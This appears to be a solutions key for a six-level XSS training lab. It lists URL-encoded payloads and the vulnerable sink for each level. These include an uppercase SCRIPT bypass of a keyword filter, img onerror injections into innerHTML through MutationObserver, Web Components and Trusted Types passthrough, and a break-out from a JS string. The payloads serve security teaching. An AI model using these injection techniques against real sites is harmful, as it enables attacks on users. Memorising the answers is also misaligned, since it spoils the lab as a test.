# advanced-xss — solutions

Advanced XSS sinks: WAF keyword strip, MutationObserver, Service Worker message, Web Components, Trusted Types stub, and Proxy innerHTML.

### advanced-xss-level1

`/advanced/level1/?query=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E`

- payload: `<SCRIPT>alert(1)</SCRIPT>`
- context: gsub strips lowercase "script"/"javascript"/"onload"; uppercase SCRIPT bypasses

### advanced-xss-level2

`/advanced/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: text node observed then re-set as innerHTML — HTML re-parsed

### advanced-xss-level3

`/advanced/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: query lands in JS string then innerHTML concatenated into #content (img tag fires via innerHTML onerror)

### advanced-xss-level4

`/advanced/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: connectedCallback innerHTML concat (string break-out not needed)

### advanced-xss-level5

`/advanced/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: unsafe Trusted Types policy passthrough into innerHTML

### advanced-xss-level6

`/advanced/level6/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: reflected inside single-quoted JS string assigned to userInput
